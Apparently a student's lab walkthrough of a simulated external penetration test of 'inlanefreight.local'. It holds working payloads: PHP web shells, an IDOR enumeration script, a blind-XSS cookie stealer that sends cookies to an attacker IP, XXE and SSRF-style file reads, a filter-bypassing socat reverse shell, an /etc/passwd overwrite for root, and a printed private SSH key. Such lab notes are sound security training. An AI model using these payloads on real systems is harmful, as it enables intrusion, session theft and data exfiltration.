tar=10.129.229.147
Added target to etc hosts file
$ sudo nano /etc/hosts

![[Pasted image 20260128101443.png]]
$ sudo nmap -sC -sV -p- -open -oA inlanefreight_tcp_all $tar
Open ports discovered:

- **21/tcp** — FTP (vsftpd 3.0.3)
- **22/tcp** — SSH (OpenSSH 8.2p1)
- **25/tcp** — SMTP (Postfix smtpd)
- **53/tcp** — DNS (1337_HTB_DNS)
- **80/tcp** — HTTP (Apache httpd 2.4.41)
- **110/tcp** — POP3 (Dovecot pop3d)
- **111/tcp** — RPC (rpcbind)
- **143/tcp** — IMAP (Dovecot imapd)
- **993/tcp** — IMAPS (Dovecot imapd)
- **995/tcp** — POP3S (Dovecot pop3d)
- **8080/tcp** — HTTP (Apache httpd 2.4.41)

SNIP
53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
| dns-nsid: 
|_  bind.version: 1337_HTB_DNS
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
SNIP

 Perform a banner grab of the services listening on the target host and find a non-standard service banner. Submit the name as your answer (format: word_word_word)
 - 1337_HTB_DNS

$ dig axfr inlanefreight.local @$tar

![[Pasted image 20260128101805.png]]

- HTB{DNs_ZOn3_Tr@nsf3r} flag discovered
---
Discovered the following subdomains

blog.inlanefreight.local  
careers.inlanefreight.local  
dev.inlanefreight.local  
flag.inlanefreight.local  
gitlab.inlanefreight.local  
ir.inlanefreight.local  
status.inlanefreight.local  
support.inlanefreight.local  
tracking.inlanefreight.local
vpn.inlanefreight.local



Added those subdomains to the /etc/hosts file -

$ echo "10.129.20.249 $(awk '$1 ~ /inlanefreight\.local\./ { sub(/\.$/, "", $1); print $1 }' dns.txt | sort -u | tr '\n' ' ')" | sudo tee -a /etc/hosts


$ curl -s -I http://10.129.229.147 -H "HOST: inlanefreight.local" | grep "Content-Length:"
	Content-Length: 15157

$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://10.129.229.147 -H 'Host:FUZZ.inlanefreight.local' -fs 15157

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.229.147
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.inlanefreight.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15157
________________________________________________

dev                     [Status: 200, Size: 2048, Words: 643, Lines: 74, Duration: 36ms]
status                  [Status: 200, Size: 878, Words: 105, Lines: 43, Duration: 50ms]
monitoring              [Status: 200, Size: 56, Words: 3, Lines: 4, Duration: 21ms]
careers                 [Status: 200, Size: 51806, Words: 22041, Lines: 732, Duration: 35ms]
tracking                [Status: 200, Size: 35211, Words: 10413, Lines: 791, Duration: 35ms]
vpn                     [Status: 200, Size: 1578, Words: 414, Lines: 35, Duration: 1271ms]
ir                      [Status: 200, Size: 28548, Words: 2885, Lines: 210, Duration: 1510ms]
support                 [Status: 200, Size: 26635, Words: 11730, Lines: 523, Duration: 3051ms]
gitlab                  [Status: 302, Size: 113, Words: 5, Lines: 1, Duration: 64ms]
blog                    [Status: 200, Size: 8708, Words: 1509, Lines: 232, Duration: 3911ms]
www.monitoring          [Status: 200, Size: 56, Words: 3, Lines: 4, Duration: 9ms]
:: Progress: [114441/114441] :: Job [1/1] :: 790 req/sec :: Duration: [0:01:44] :: Errors: 0 ::

![[Pasted image 20260128102559.png]]
---
Perform vhost discovery. What additional vhost exists? (one word)
- monitoring

Anonymous FTP login discovered on target
![[Pasted image 20260128103013.png]]

Grabbed flag
![[Pasted image 20260128103022.png]]

Unable to change directories in the anonymous ftp session
![[Pasted image 20260128103100.png]]
Unable to put files either
![[Pasted image 20260128105918.png]]

----
SSH banner grab 
![[Pasted image 20260128110025.png]]
Tried to brute force some passwords like admin:password admin:admin root:toor but no hits, doesn't seem to be anything interesting here

----
Scanned SMTP (Port 25)
![[Pasted image 20260128110406.png]]
![[Pasted image 20260128110458.png]]
VRFY command is not disabled, and we can use this to enumerate valid users. This could potentially be leveraged to gather a list of users we could use to mount a password brute-forcing attack against the FTP and SSH services and perhaps others. Though this is relatively low-risk, it's worth noting down as a **Low finding** for our report as our clients should reduce their external attack surface as much as possible. If this is no valid business reason for this command to be enabled, then we should advise them to disable it.

----
![[Pasted image 20260128111057.png]]Port 111 is the `rpcbind` service which should not be exposed externally, so we could write up a **Low finding** for `Unnecessary Exposed Services` or similar. This port can be probed to fingerprint the operating system or potentially gather information about available services. We can try to probe it with the [rpcinfo](https://linux.die.net/man/8/rpcinfo) command or Nmap. It works, but we do not get back anything useful. Again, worth noting down so the client is aware of what they are exposing but nothing else we can do with it.

----
Port 80 (HTTP)
Drupal instance doesn't look like it's use at http://blog.inlanefreight.local - could be worth taking down to furthe reduce the overall external attack surface
![[Pasted image 20260128112851.png]]

$ echo 'inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local' > ilfreight_subdoms

$git clone https://github.com/RedSiege/EyeWitness

$ sudo ./setup.sh
$ pip install -r requirements.txt 
$ cd ~/EyeWitness/Python
$ python3 EyeWitness.py -f ~/ilfreight_subdoms -d ilfreight_subdom_EyeWitness

![[Pasted image 20260128111547.png]]
$ cd ilfreight_subdom
$ firefox report.html

Registered a user at http://careers.inlanfreight.local/register
User:hacker
password:password1
![[Pasted image 20260128111821.png]]
**Attacking the IDOR vuln**
Noticed the profile page landed me on http://careers.inlanefreight.local/profile?id=9
Sent the request to BURP and changed the ID, got a different result - IDOR identitfied

$ cat idorscript.sh 
#!/bin/bash

#### Define the cookie from your Burp/DevTools output
COOKIE="session=eyJsb2dnZWRfaW4iOnRydWV9.aXj8yg.y-A3bUkK3fBxxEAwZDN5ro0BTN4"
URL="http://careers.inlanefreight.local/profile?id="

for i in {1..50}; do
    # Perform the request with the cookie
    # -s (silent), -b (cookie string)
    response=$(curl -s -b "$COOKIE" "$URL$i")
    
    # Extract the name from the "Jobs applied by..." header
    # This helps us see which IDs belong to which users
    user=$(echo "$response" | grep -oP "Jobs applied by \K[^<]+")
    
    if [ -n "$user" ]; then
        echo "[+] ID $i belongs to: $user"
        
        # Check this specific response for the flag
        if echo "$response" | grep -qiE "HTB|flag|{"; then
            echo "    [!!!] FLAG FOUND on ID $i!"
            echo "$response" | grep -oE "HTB\{.*?\}"
        fi
    else
        echo "[-] ID $i: No data or Access Denied"
    fi
done

$ bash idorscript.sh 
	[+] ID 1 belongs to: James
	[+] ID 2 belongs to: Harry
	[+] ID 3 belongs to: Tom
	[+] ID 4 belongs to: htb-student
	[!!!] FLAG FOUND on ID 4!
	HTB{8f40ecf17f681612246fa5728c159e46}
	[+] ID 5 belongs to: Jerry
	[+] ID 6 belongs to: James
	[+] ID 7 belongs to: John
	[+] ID 8 belongs to: Miller
	[+] ID 9 belongs to: test

---
----
Next targetting dev.inlanefreight.local
**Exploiting the HTML Verb Tampering**
$ gobuster dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

![[Pasted image 20260128112312.png]]

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.php        (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]
/index.php            (Status: 200) [Size: 2048]
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]
/.htaccess            (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/server-status        (Status: 403) [Size: 288]
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php           (Status: 200) [Size: 14]
/.php                 (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]

===============================================================

- /uploads is quite interesting


GET requests show a 403 Forbidden message
![[Pasted image 20260128113055.png]]

However, TRACK requests show X-Custom-IP-Authorization: 172.18.0.1 header is set in the HTTP response
![[Pasted image 20260128113116.png]]

Adding the header and requesting the page yields an interesting result - 

![[Pasted image 20260128113411.png]]
Copied response in browser to reveal an upload page
![[Pasted image 20260128113452.png]]![[Pasted image 20260128113534.png]]

$ echo "<?php system($_GET['cmd']); ?>" > 5351bf7271abaa2267e03c9ef6393f13.php

Getting error  "JPG, JPEG, PNG & GIF files are allowed."
![[Pasted image 20260128113733.png]]Using Burp changed the Content-Type: image/png - **resulted in a successful PHP web shell upload**

![[Pasted image 20260128130230.png]]
RCE Achieved through web shell 
![[Pasted image 20260128130716.png]]
$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)

![[Pasted image 20260128132006.png]]

$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=cat+/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

----
The next target in our list is `http://ir.inlanefreight.local`, the company's Investor Relations Portal hosted with WordPress.


$msfvenom -p php/reverse_php LHOST=10.10.15.73 LPORT=4444 -o shell.php
$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
![[Pasted image 20260128132649.png]]

**Discovered the following from the WPScan -**

WordPress out of date **Version 6.0** (Insecure)
![[Pasted image 20260128132619.png]]
WordPress theme is use is cbusiness-investment out of date **Version 0.7**
![[Pasted image 20260128132447.png]]
b2i-investor-tools plugin installed out of date **Version 1.0.5**
![[Pasted image 20260128133018.png]]mail-masta plugin installed 
![[Pasted image 20260128133117.png]]
The `Mail Masta` plugin is an older plugin with several known vulnerabilities. We can use [this](https://www.exploit-db.com/exploits/50226) exploit to read files on the underlying file system by leveraging a Local File Inclusion (LFI) vulnerability. Finding: **Local File Inclusion (LFI)** 

![[Pasted image 20260128133314.png]]

$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Enumerated users using wpscan 

$ sudo wpscan -e u -t 500 --url http://ir.inlanefreight.local

SNIP

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

SNIP

We find several users:

- ilfreightwp
- tom
- james
- john

$ sudo wpscan --url http://ir.inlanefreight.local -P rockyou.txt -U ilfreightwp

SNIP
[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1
SNIP

Found creds, next went to http://ir.inlanefreight.local/wp-login.php and logged in using the credentials ilfreightwp:password1

Went into Theme File Editor selected theme Twenty Twenty to edit the inactive 404.php page and put in a php web shell to get RCE - system($_GET[0]);

![[Pasted image 20260128135154.png]]

Able to curl the wordpress content page where this .php file is located to achieve **Remote Code Execution**
![[Pasted image 20260128135323.png]]

$ curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php?0=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)


$ curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php?0=cat+/etc/passwd
	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

----
Next target is http://status.inlanefreight.local

Noticed a search input field, putting in a single quote ' displays a SQL error

![[Pasted image 20260128140945.png]]
This tells us that it's SQL injectable
Copied the BURP post request to a file: req.txt
![[Pasted image 20260128141037.png]]

$ sqlmap -r req.txt --batch --dbs
 SNIP

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys

SNIP

$ sqlmap -r req.txt -D status -T users --columns

  SNIP
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int          |
| password | varchar(33)  |
| username | varchar(200) |
+----------+--------------+
SNIP

$ sqlmap -r req.txt -D status -T users -C id,username,password --dump

 SNIP
[2 entries]
+----+----------+-----------------------------------+
| id | username | password                          |
+----+----------+-----------------------------------+
| 1  | Admin    | 4528342e54d6f8f8cf15bf6e3c31bf1f6 |
| 2  | Flag     | 1fbea4df249ac4f4881a5da387eb297cf |
+----+----------+-----------------------------------+
SNIP

Also could have used this to locate the flag
$ sqlmap -r req.txt --where="username='flag'" --dump

----
Next we tested http://support.inlanefreight.local a ticketing software
In the ticket message we included a XSS check 

 "><script src=http://10.10.15.73:4444/TESTING_THIS></script>
![[Pasted image 20260128153737.png]]

$ nc -lvnp 4444
	listening on [any] 4444 ...
	connect to [10.10.15.73] from (UNKNOWN) [10.129.14.164] 49806
	GET /TESTING_THIS HTTP/1.1
	Host: 10.10.15.73:4444
	Connection: keep-alive
	User-Agent: HTBXSS/1.0
	Accept: */*
	Referer: http://127.0.0.1/
	Accept-Encoding: gzip, deflate
	Accept-Language: en-US

This is vulnerable to a Blind Cross-Site Scripting (XSS) attack

Created the following two files - 

index.php
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

and

script.js
```javascript
new Image().src='http://10.10.15.73:9001/index.php?c='+document.cookie
```

Next, we started a PHP web server on our attack host

```shell-session
sudo php -S 0.0.0.0:9001
```

We get a callback on our web server with an admin's session cookie
![[Pasted image 20260128154128.png]]

$ sudo php -S 0.0.0.0:9001
	[Wed Jan 28 14:40:27 2026] PHP 8.2.29 Development Server (http://0.0.0.0:9001) started
	[Wed Jan 28 14:40:48 2026] 10.129.14.164:33142 Accepted
	[Wed Jan 28 14:40:48 2026] 10.129.14.164:33142 [200]: GET /script.js
	[Wed Jan 28 14:40:48 2026] 10.129.14.164:33142 Closing
	[Wed Jan 28 14:40:48 2026] 10.129.14.164:33144 Accepted
	[Wed Jan 28 14:40:48 2026] 10.129.14.164:33144 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

Next, using Cookie-Editor plugin we created the admin's session cookie as **session** and hit **login**

This authorized access to the admin dashboard
![[Pasted image 20260128154532.png]]

This is a XSS is a **high-risk finding** because it can be used to steal an active admin's session and access the ticketing queue system.

---
Next we tested http://tracking.inlanefreight.local/

We noticed this interesting input search box field

![[Pasted image 20260128155726.png]]
![[Pasted image 20260128155801.png]]

Entered the following into the input field: `"><S>aaa` which yields interesting results

![[Pasted image 20260130161012.png]]
![[Pasted image 20260130160645.png]]
which seems to mean that the JavaScript code is executing when the webserver generates the document.

I was able to read the /etc/passwd 

```html
<script>
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)
};
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```

![[Pasted image 20260202100533.png]]

![[Pasted image 20260202100550.png]]

To read flag: 
```html
<script>
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)
};
    x.open("GET","file:///flag.txt");
    x.send();
</script>
```

----
Next up is http://gitlab.inlanefreight.local

Created an account and navigated to Groups, found this internal group
![[Pasted image 20260202103243.png]]

Able to discover sensitive internal data here another high-risk finding: **Misconfigured GitLab Instance.**
![[Pasted image 20260202103329.png]]

Added the vhost shopdev2.inlanefreight.local to the /etc/hosts file

Redirected to /login.php was able to sign in using default creds admin:admin ![[Pasted image 20260202110625.png]]

Navigated to the /cart.php, and hit "I AGREE" followed by "COMPLETE PURCHASE"

Captured the request in burp proxy, which displays this POST request: 

![[Pasted image 20260202111350.png]]

```
Selector Mismatch: The code is trying to find an element with the ID #subtotal using $('#subtotal').

Missing ID: If we scan the HTML of the cart.php page we shared, there is no element with id="subtotal". There is a <dt>Subtotal</dt>, but the value is inside a <dd> tag with no ID at all.

Result: Since jQuery can't find #subtotal, .val() returns undefined. This is why your Burp request shows: <subtotal>undefined</subtotal>

Target Selection: It identifies the <subtotal> field as the perfect "sink" for a XXE payload.
```

![[Pasted image 20260202111653.png]]![[Pasted image 20260202111731.png]]

Able to read the /etc/passwd utilizing
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxe;
	</userid>
</root>
```
This is a **high-risk finding** due to XML External Entity (XXE) Injection.

----
Next, starting digging into http://monitoring.inlanefreight.local/

It defaults to a login page - /login.php
Tried guessing admin:admin and some common passwords, no hits
Attempted a SQL injection ' OR 1=1 --, no SQL error message simply returns "Invalid Credentials!"

Ran hydra on it filtering out "Invalid Credentials!"

```
$ hydra -l admin -P rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid Credentials!"
```
![[Pasted image 20260202113111.png]]
Was able to find a password for admin:12qwaszx

Logging in shows an admin terminal, which is restricted to the following commands - 

admin@inlanefreight:~$ help
ls -
cat -
whoami -
date -
help -
clear -
reboot -
cd -
mv -
rm -
rmdir -
touch -
connection_test -

![[Pasted image 20260202115304.png]]

Reading the files shows the following:
![[Pasted image 20260202115353.png]]
Testing out connection_test simply shows "Success"
![[Pasted image 20260202115439.png]]
Capturing this in burp details this request -
![[Pasted image 20260202115512.png]]
And this response -
![[Pasted image 20260202115542.png]]
We can infer that the `/ping.php` script is running an operating command using a PHP function such as `shell_exec(ping -c 1 127.0.0.1)`

Noticed that the character %0a wasn't blacklisted
![[Pasted image 20260202120025.png]]![[Pasted image 20260202120033.png]]

Attempted at GET /ping.php?ip=127.0.0.1%0aid HTTP/1.1 
Failed with Invalid input
GET /ping.php?ip=127.0.0.1%0a'i'd HTTP/1.1
Returned a result, which means we have successfully bypassed blacklisted characters

![[Pasted image 20260202120314.png]]
![[Pasted image 20260202120328.png]]

Pivoted to curl commands from here

$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms
```
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
br-65c448355ed2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::42:f9ff:fee8:3f1  prefixlen 64  scopeid 0x20<link>
        ether 02:42:f9:e8:03:f1  txqueuelen 0  (Ethernet)
        RX packets 2314  bytes 11331853 (11.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2490  bytes 516177 (516.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:25ff:fe0d:fcc2  prefixlen 64  scopeid 0x20<link>
        ether 02:42:25:0d:fc:c2  txqueuelen 0  (Ethernet)
        RX packets 49  bytes 57910 (57.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 88  bytes 6626 (6.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.20.249  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb0:a7ba  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb0:a7ba  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:a7:ba  txqueuelen 1000  (Ethernet)
        RX packets 77000  bytes 6956417 (6.9 MB)
        RX errors 0  dropped 1  overruns 0  frame 0
        TX packets 44635  bytes 21357727 (21.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb0:dd01  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:dd:01  txqueuelen 1000  (Ethernet)
        RX packets 1909  bytes 126250 (126.2 KB)
        RX errors 0  dropped 24  overruns 0  frame 0
        TX packets 78  bytes 6796 (6.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 23799  bytes 13120055 (13.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23799  bytes 13120055 (13.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Discovered that this host has multiple IP addresses, one of which places it inside the 172.16.8.0/24 network that was a part of the initial scope.

Switching back to Burp and made the request - GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php HTTP/1.1

![[Pasted image 20260202121042.png]]

Which provides the following request: 
``` html
HTTP/1.1 200 OK
Date: Mon, 02 Feb 2026 17:09:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1221
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.046/0.046/0.046/0.000 ms
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$output = '';

function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }
  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }

  return false;
}

if (isset($_GET['ip'])) {
  $ip = $_GET['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
<?php
echo $output;
?>
```

Majority of options for getting a reverse shell are filtered, however one that isn't is **socat**.

Set up a listener on my attack box - 
$ socat -d -d TCP-LISTEN:4444 STDOUT

![[Pasted image 20260202121921.png]]
Sent the following request via burp GET /ping.php?ip=127.0.0.1%0a's'ocat${IFS}TCP4:10.10.14.10:4444${IFS}EXEC:'b'ash HTTP/1.1

Listener caught and was able to pop a reverse shell

![[Pasted image 20260202121948.png]]

To upgrade to a Interactive TTY shell, we first ran this on the Target Host

- python3 -c 'import pty; pty.spawn("/bin/bash")'
- Ctrl+Z (to background the shell)

Attack Box terminal 
- stty raw -echo; fg

Back to Target Host
- reset
- xterm

Now we have an interactive TTY Shell, the reason for doing this is to get a proper terminal so we can run commands like su, sudo, ssh, use command completion, and open a text editor if needed.
aureport is a tool that produces summary reports of the audit system logs.
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less


![[Pasted image 20260202144915.png]]

Escalating privileges with the creds obtained:
webdev@dmz01:/var/www/html/monitoring$ su srvadm
Password: ILFreightnixadm!

srvadm:ILFreightnixadm!

![[Pasted image 20260202145644.png]]
We can also ssh into here from the attackbox
ssh srvadmin@10.129.25.186

$ /bin/bash -i 
to get an improved shell

**Local Privilege Escalation (LPE)**
Discovered that srvadm may run /usr/bin/openssl as sudo
![[Pasted image 20260202153456.png]]
User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl
The openssl gtfobin https://gtfobins.org/gtfobins/openssl/
From here we can LPE to root multiple ways.

The following commands could ran to set the root password to empty and achieve root
	$ echo "root::0:0:root:/root:/bin/bash" > /tmp/emergency_passwd
	$ sudo openssl enc -in /tmp/emergency_passwd -out /etc/passwd
	$ su root
![[Pasted image 20260202155222.png]]

srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa
vpXx+yT/M2X9boHpZHluuR9YiGDMZlr3b4hARkbQAc0l66UD+NB9BjH3q/kL84rRASMZ88
y2jUwmR75Uw/wmZxeVD5E+yJGuWd+ElpoWtDW6zenZf6bqSS2VwLhbrs3zyJAXG1eGsGe6
i7l59D31mLOUUKZxYpsciHflfDyCJ79siXXbsZSp5ZUvBOto6JF20Pny+6T0lovwNCiNEz
7avg7o/77lWsfBVEphtPQbmTZwke1OtgvDqG1v4bDWZqKPAAMxh0XQxscpxI7wGcUZbZeF
9OHCWjY39kBVXObER1uAvXmoJDr74/9+OsEQXoi5pShB7FSvcALlw+DTV6ApHx239O8vhW
/0ZkxEzJjIjtjRMyOcLPttG5zuY1f2FBt2qS1w0VAAAFgIqVwJSKlcCUAAAAB3NzaC1yc2
EAAAGBANJLF4CCx0W9I9bN6WR/LPxBWHsEnm6BIuBpEaIHUedxll3qexiTCKMbl02mJDEh
RvQpYo9V+nK5HFi50i7iiPCkual7LjViErfk9W6b035hcpgyFjceHn0f2KGr6V8fsk/zNl
